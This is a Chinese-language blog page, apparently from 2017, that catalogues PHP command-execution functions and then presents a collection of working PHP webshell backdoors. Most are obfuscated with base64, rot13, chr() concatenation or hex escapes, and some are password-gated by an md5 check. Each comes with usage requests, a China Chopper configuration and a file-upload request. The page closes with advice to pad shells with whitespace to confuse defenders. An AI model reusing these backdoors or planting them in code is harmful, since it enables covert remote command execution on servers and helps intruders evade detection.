@@ -1,0 +1,1336 @@
+<!DOCTYPE html>
+
+
+
+
+<html class="theme-next mist" lang="zh-Hans">
+<head>
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="googleaf0347feb5ea0936.html" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="php," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Introspelliam" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.2" />
+
+
+
+
+
+
+<meta name="description" content="获取输入数据的手段$\_GET[&amp;quot;password&amp;quot;] $\_POST[&amp;quot;password&amp;quot;] $\_REQUEST[&amp;quot;password&amp;quot;] $\_COOKIE[&amp;quot;password&amp;quot;] $\_GET[&amp;quot;password&amp;quot;] $\_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;] $">
+<meta name="keywords" content="php">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php后门">
+<meta property="og:url" content="http://yoursite.com/2017/08/28/web/php后门/index.html">
+<meta property="og:site_name" content="Introspelliam">
+<meta property="og:description" content="获取输入数据的手段$\_GET[&amp;quot;password&amp;quot;] $\_POST[&amp;quot;password&amp;quot;] $\_REQUEST[&amp;quot;password&amp;quot;] $\_COOKIE[&amp;quot;password&amp;quot;] $\_GET[&amp;quot;password&amp;quot;] $\_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;] $">
+<meta property="og:updated_time" content="2018-07-09T11:41:14.970Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="php后门">
+<meta name="twitter:description" content="获取输入数据的手段$\_GET[&amp;quot;password&amp;quot;] $\_POST[&amp;quot;password&amp;quot;] $\_REQUEST[&amp;quot;password&amp;quot;] $\_COOKIE[&amp;quot;password&amp;quot;] $\_GET[&amp;quot;password&amp;quot;] $\_SERVER[&amp;#39;HTTP_USER_AGENT&amp;#39;] $">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.2',
+    sidebar: {"position":"right","display":"always","offset":0,"offset_float":0,"b2t":true,"scrollpercent":true,"onmobile":true},
+    fancybox: true,
+    tabs: true,
+    motion: false,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2017/08/28/web/php后门/"/>
+
+
+
+
+
+  <title>php后门 | Introspelliam</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?663212c5ef558c27e77385b620f14823";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <!-- hexo-inject:begin --><!-- hexo-inject:end --><div class="container sidebar-position-right page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Introspelliam</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">Just do what works for you, because there will always be someone who thinks differently.</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-sitemap">
+          <a href="/sitemap.xml" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br />
+            
+            站点地图
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/28/web/php后门/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Introspelliam">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/me.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Introspelliam">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">php后门</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-28T20:39:59+08:00">
+                2017-08-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="获取输入数据的手段"><a href="#获取输入数据的手段" class="headerlink" title="获取输入数据的手段"></a>获取输入数据的手段</h3><p>$\_GET[&quot;password&quot;]</p>
+<p>$\_POST[&quot;password&quot;]</p>
+<p>$\_REQUEST[&quot;password&quot;]</p>
+<p>$\_COOKIE[&quot;password&quot;]</p>
+<p>$\_GET[&quot;password&quot;]</p>
+<p>$\_SERVER[&#39;HTTP_USER_AGENT&#39;]</p>
+<p>$\_SERVER[&#39;HTTP_HOST&#39;]</p>
+<p>$_SERVER[&#39;HTTP_REFERER&#39;]</p>
+<p>$_SERVER[&#39;HTTP_ACCEPT_LANGUAGE&#39;]    // Accept-Language: </p>
+<p>$_SERVER[&#39;HTTP_ACCEPT_CHARSET&#39;]    // Accept-Charset:</p>
+<p>$_SERVER[&#39;QUERY_STRING&#39;]    /?abcdef</p>
+<p>$_SERVER[&#39;HTTP_X\_FORWARDED\_FOR&#39;]</p>
+<p>$_SERVER[&#39;HTTP_CONNECTION&#39;]    // Connection: </p>
+<p>$_SERVER[&#39;HTTP_ACCEPT_ENCODING&#39;]  // Accept-Encoding: </p>
+<p>$_SERVER[&#39;HTTP_ACCEPT&#39;]        // Accept: </p>
+<p>$_SERVER[&#39;HTTP_VIA&#39;]        // Via: </p>
+<p>$_SERVER[&#39;HTTP_CLIENT_IP&#39;]    // Client-IP:</p>
+<p>$_SERVER[&#39;HTTP_UPGRADE_INSECURE_REQUESTS&#39;]    // Upgrade-Insecure-Requests:</p>
+<p>$_SERVER[&quot;HTTP_CACHE_CONTROL&quot;]    // Cache-Control:</p>
+<p>$_SERVER[&quot;HTTP_KEEP_ALIVE&quot;]            // Keep-Alive: </p>
+<p>$\_SERVER[&quot;HTTP_AB_CD&quot;]        // Ab-Cd: </p>
+<blockquote>
+<p>其实从后面的$\<em>SERVER[&quot;HTTP\</em>&quot;]的一些展示可以看出，对于头文件中的任意字段，只需要将-转换为\<em>，并且将所有字母转化为大写，那么就可以在php后端中进行处理！所以以HTTP</em>开头的内容，其实是自定义内容！</p>
+</blockquote>
+<h3 id="php命令执行函数"><a href="#php命令执行函数" class="headerlink" title="php命令执行函数"></a>php命令执行函数</h3><p>php提供4种方法执行系统外部命令：exec()、passthru()、system()、 shell_exec()。<br>在开始介绍前，先检查下php配置文件php.ini中是有禁止这是个函数。找到 disable_functions，配置如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">disable_functions =</div></pre></td></tr></table></figure>
+<p>如果“disable_functions=”后面有接上面四个函数，将其删除。<br>默认php.ini配置文件中是不禁止你调用执行外部命令的函数的。</p>
+<h4 id="exec"><a href="#exec" class="headerlink" title="exec()"></a>exec()</h4><p>string <strong>exec</strong> ( string <code>$command</code> [, array <code>&amp;$output</code> [, int <code>&amp;$return_var</code> ]] )</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">echo</span> exec(<span class="string">"ls"</span>,$file);</div><div class="line">        <span class="keyword">echo</span> <span class="string">"&lt;/br&gt;"</span>;</div><div class="line">        print_r($file);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">test.php</div><div class="line">Array( [0] =&gt; index.php [1] =&gt; test.php)</div></pre></td></tr></table></figure>
+<p>知识点：<br>exec 执行系统外部命令时不会输出结果，而是返回结果的最后一行，如果你想得到结果你可以使用第二个参数，让其输出到指定的数组，此数组一个记录代表输出的一行，即如果输出结果有20行，则这个数组就有20条记录，所以如果你需要反复输出调用不同系统外部命令的结果，你最好在输出每一条系统外部命令结果时清空这个数组，以防混乱。第三个参数用来取得命令执行的状态码，通常执行成功都是返回0。</p>
+<h4 id="passthru"><a href="#passthru" class="headerlink" title="passthru()"></a>passthru()</h4><p>void <strong>passthru</strong> ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        passthru(<span class="string">"ls"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">index.phptest.php</div></pre></td></tr></table></figure>
+<p>知识点：<br>passthru与exec的区别，passthru直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，不返回任何值，且其可以输出二进制，比如图像数据。</p>
+<h4 id="system"><a href="#system" class="headerlink" title="system()"></a>system()</h4><p>string <strong>system</strong> ( string <code>$command</code> [, int <code>&amp;$return_var</code> ] )</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">        system(&quot;ls /&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">binbootcgroupdevetchomeliblost+foundmediamntoptprocrootsbinselinuxsrvsystmpusrvar</div></pre></td></tr></table></figure>
+<p>知识点：<br>system和exec的区别在于system在执行系统外部命令时，直接将结果输出到浏览器，不需要使用 echo 或 return 来查看结果，如果执行命令成功则返回true，否则返回false。第二个参数与exec第三个参数含义一样。</p>
+<h4 id="反撇号-和shell-exec"><a href="#反撇号-和shell-exec" class="headerlink" title="反撇号`和shell_exec()"></a>反撇号`和shell_exec()</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">        <span class="keyword">echo</span> `pwd`;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/var/www/html</div></pre></td></tr></table></figure>
+<p>知识点：</p>
+<p>shell_exec() 函数实际上仅是反撇号 (`) 操作符的变体</p>
+<h4 id="popen"><a href="#popen" class="headerlink" title="popen()"></a>popen()</h4><p>resource <strong>popen</strong> ( string <code>$command</code> , string <code>$mode</code> )</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$handle = popen(<span class="string">"dir"</span>, <span class="string">"r"</span>);</div><div class="line">$read = fread($handle, <span class="number">4096</span>);</div><div class="line"><span class="keyword">echo</span> $read;</div><div class="line">pclose($handle);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"> E:\wamp\www\</div><div class="line"></div><div class="line">2017/08/28  19:27    &lt;DIR&gt;          .</div><div class="line">2017/08/28  19:27    &lt;DIR&gt;          ..</div><div class="line">2017/08/20  11:43               656 404.php</div><div class="line">2017/05/07  13:51               145 302.php</div></pre></td></tr></table></figure>
+<p>知识点：</p>
+<p>popen也可以执行命令，知识执行命令时不是很方便</p>
+<h4 id="pcntl-exec"><a href="#pcntl-exec" class="headerlink" title="pcntl_exec()"></a>pcntl_exec()</h4><p>void <strong>pcntl_exec</strong> ( string <code>$path</code> [, array <code>$args</code> [, array <code>$envs</code> ]] )</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">#exec.php</div><div class="line">&lt;?php pcntl_exec(“/bin/bash”, array(“/tmp/b4dboy.sh”));?&gt;</div><div class="line"></div><div class="line">#/tmp/b4dboy.sh</div><div class="line">#!/bin/bash</div><div class="line">ls -l /</div></pre></td></tr></table></figure>
+<h3 id="php后门"><a href="#php后门" class="headerlink" title="php后门"></a>php后门</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>($_POST[<span class="number">1</span>]);<span class="meta">?&gt;</span></div><div class="line">post: <span class="number">1</span>=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(str_rot13(<span class="string">'riny($_CBFG[cntr]);'</span>));<span class="meta">?&gt;</span></div><div class="line">post: page=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> call_user_func(create_function(<span class="keyword">null</span>,<span class="string">'assert($_POST[c]);'</span>));<span class="meta">?&gt;</span></div><div class="line">post: c=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $x=base64_decode(<span class="string">"YXNzZXJ0"</span>);$x($_POST[<span class="string">'c'</span>]);<span class="meta">?&gt;</span></div><div class="line">中间base64解密为assert</div><div class="line">post: c=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> array_map(<span class="string">"ass\x65rt"</span>,(<span class="keyword">array</span>)$_REQUEST[<span class="string">'expdoor'</span>]);<span class="meta">?&gt;</span></div><div class="line">get/post: expdoor=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @preg_replace(<span class="string">"/f/e"</span>,$_GET[<span class="string">'u'</span>],<span class="string">"fengjiao"</span>); <span class="meta">?&gt;</span></div><div class="line"></div><div class="line">mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = <span class="number">-1</span> [, int &amp;$count ]] )</div><div class="line">◆i ：如果在修饰符中加上<span class="string">"i"</span>，则正则将会取消大小写敏感性，即<span class="string">"a"</span>和<span class="string">"A"</span> 是一样的。</div><div class="line">◆m：默认的正则开始<span class="string">"^"</span>和结束<span class="string">"$"</span>只是对于正则字符串如果在修饰符中加上<span class="string">"m"</span>，那么开始和结束将会指字符串的每一行：每一行的开头就是<span class="string">"^"</span>，结尾就是<span class="string">"$"</span>。</div><div class="line">◆s：如果在修饰符中加入<span class="string">"s"</span>，那么默认的<span class="string">"."</span>代表除了换行符以外的任何字符将会变成任意字符，也就是包括换行符！</div><div class="line">◆x：如果加上该修饰符，表达式中的空白字符将会被忽略，除非它已经被转义。</div><div class="line">◆e：本修饰符仅仅对于replacement有用，代表在replacement中作为PHP代码。</div><div class="line">◆A：如果使用这个修饰符，那么表达式必须是匹配的字符串中的开头部分。比如说<span class="string">"/a/A"</span>匹配<span class="string">"abcd"</span>。</div><div class="line">◆E：与<span class="string">"m"</span>相反，如果使用这个修饰符，那么<span class="string">"$"</span>将匹配绝对字符串的结尾，而不是换行符前面，默认就打开了这个模式。</div><div class="line">◆U：和问号的作用差不多，用于设置<span class="string">"贪婪模式"</span>。</div><div class="line"></div><div class="line">http:<span class="comment">//localhost/test2.php?u=eval($_POST[c]);</span></div><div class="line">post: c=system(<span class="string">"ls"</span>);</div><div class="line"></div><div class="line">菜刀中：</div><div class="line">密码：c</div><div class="line">配置：&lt;O&gt;u=<span class="keyword">eval</span>($_POST[c]);&lt;/O&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(base64_decode(ZXZhbChiYXNlNjRfZGVjb2RlKFpYWmhiQ2hpWVhObE5qUmZaR1ZqYjJSbEtFeDVPRGhRTTBKdlkwRndiR1J0Um5OTFExSm1WVVU1VkZaR2RHdGlNamw1V0ZOclMweDVPQzVqYUhJb05EY3BMbEJuS1NrNykpOw));<span class="meta">?&gt;</span></div><div class="line"></div><div class="line">其实其将</div><div class="line"><span class="comment">//<span class="meta">&lt;?php</span></span></div><div class="line"><span class="keyword">eval</span>($_POST[door])</div><div class="line"><span class="comment">//<span class="meta">?&gt;</span></span></div><div class="line">多次base64加密解密，并且在一定程度上进行了混淆(插入了chr(<span class="number">47</span>))</div><div class="line"></div><div class="line">post: door=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">include</span>($_FILES[<span class="string">'u'</span>][<span class="string">'tmp_name'</span>]);  <span class="meta">?&gt;</span></div><div class="line"></div><div class="line">上传一个木马文件，最好的方式是上传一个大马，这样对方就很难进行测试</div><div class="line"></div><div class="line">请求：</div><div class="line">/index.php?c=system(<span class="string">'ls'</span>);</div><div class="line">Content-Type: multipart/form-data; boundary=--------------------------<span class="number">-262952846810849</span></div><div class="line">  </div><div class="line">----------------------------<span class="number">-262952846810849</span></div><div class="line">Content-Disposition: form-data; name=<span class="string">"u"</span>; filename=<span class="string">"easy.php"</span></div><div class="line">Content-Type: application/octet-stream</div><div class="line"></div><div class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_GET[c]); <span class="meta">?&gt;</span></div><div class="line">----------------------------<span class="number">-262952846810849</span>--</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>($_GET[<span class="string">"hackers"</span>]==<span class="string">"2b"</span>)&#123;<span class="keyword">if</span> ($_SERVER[<span class="string">'REQUEST_METHOD'</span>] == <span class="string">'POST'</span>) &#123; <span class="keyword">echo</span> <span class="string">"url:"</span>.$_FILES[<span class="string">"upfile"</span>][<span class="string">"name"</span>];<span class="keyword">if</span>(!file_exists($_FILES[<span class="string">"upfile"</span>][<span class="string">"name"</span>]))&#123; copy($_FILES[<span class="string">"upfile"</span>][<span class="string">"tmp_name"</span>], $_FILES[<span class="string">"upfile"</span>][<span class="string">"name"</span>]); &#125;&#125;<span class="meta">?&gt;</span>&lt;form method=<span class="string">"post"</span> enctype=<span class="string">"multipart/form-data"</span>&gt;&lt;input name=<span class="string">"upfile"</span> type=<span class="string">"file"</span>&gt;&lt;input type=<span class="string">"submit"</span> value=<span class="string">"ok"</span>&gt;&lt;/form&gt;<span class="meta">&lt;?php</span> &#125;<span class="meta">?&gt;</span></div><div class="line"></div><div class="line">用法：</div><div class="line">上传木马文件，最好还是上传大马！</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $s=@$_GET[<span class="number">2</span>];<span class="keyword">if</span>(md5($s.$s)==<span class="string">"c70d1cfca94435256f2874706af4c3c8"</span>)@<span class="keyword">eval</span>($_REQUEST[$s]); <span class="meta">?&gt;</span></div><div class="line"></div><div class="line">用法：</div><div class="line">get: ?<span class="number">2</span>=moushen</div><div class="line">post/get: moushen=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> $_uU=chr(<span class="number">99</span>).chr(<span class="number">104</span>).chr(<span class="number">114</span>);$_cC=$_uU(<span class="number">101</span>).$_uU(<span class="number">118</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">108</span>).$_uU(<span class="number">40</span>).$_uU(<span class="number">36</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">80</span>).$_uU(<span class="number">79</span>).$_uU(<span class="number">83</span>).$_uU(<span class="number">84</span>).$_uU(<span class="number">91</span>).$_uU(<span class="number">49</span>).$_uU(<span class="number">93</span>).$_uU(<span class="number">41</span>).$_uU(<span class="number">59</span>);$_fF=$_uU(<span class="number">99</span>).$_uU(<span class="number">114</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">97</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">101</span>).$_uU(<span class="number">95</span>).$_uU(<span class="number">102</span>).$_uU(<span class="number">117</span>).$_uU(<span class="number">110</span>).$_uU(<span class="number">99</span>).$_uU(<span class="number">116</span>).$_uU(<span class="number">105</span>).$_uU(<span class="number">111</span>).$_uU(<span class="number">110</span>);$_=$_fF(<span class="string">""</span>,$_cC);@$_();<span class="meta">?&gt;</span></div><div class="line"></div><div class="line">等价于：</div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$_uU=<span class="string">"chr"</span>;</div><div class="line">$_cC=<span class="string">"eval($_POST[1]);"</span>;</div><div class="line">$_fF=<span class="string">"create_function"</span>;</div><div class="line">$_=create_function(<span class="string">""</span>,<span class="string">"eval($_POST[1]);"</span>);</div><div class="line">$_();	<span class="comment">// 将上面的语句进行执行</span></div><div class="line"></div><div class="line">string create_function ( string $args , string $code )</div><div class="line">$args是参数(<span class="string">"$a,$b,$c"</span>)，$code是执行代码，返回的是函数名</div><div class="line">要调用时，直接在函数名后面加上()即可。但是需要注意的是，一定不能直接加在create_function之后，需要将其返回给一个变量，然后调用！</div><div class="line"></div><div class="line">使用：</div><div class="line">post: <span class="number">1</span>=system(<span class="string">"ls"</span>);</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">md5($_GET[<span class="string">'qid'</span>])==<span class="string">'ba710ce1a217e63bf9f5ac483d2e9a6f'</span>?array_map(<span class="string">"as\x73ert"</span>,(<span class="keyword">array</span>)$_REQUEST[<span class="string">'page'</span>]):next;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="keyword">array</span> array_map ( callable $callback , <span class="keyword">array</span> $array1 [, <span class="keyword">array</span> $... ] )</div><div class="line">array_map() 函数将用户自定义函数作用到数组中的每个值上，并返回用户自定义函数作用后的带有新值的数组。</div><div class="line"> </div><div class="line">使用：</div><div class="line">?qid=moushenhao</div><div class="line">post/get: page</div></pre></td></tr></table></figure>
+<font color="#f00">为了迷惑敌人，可以在shell中加入大量空格、换行！！</font>
+
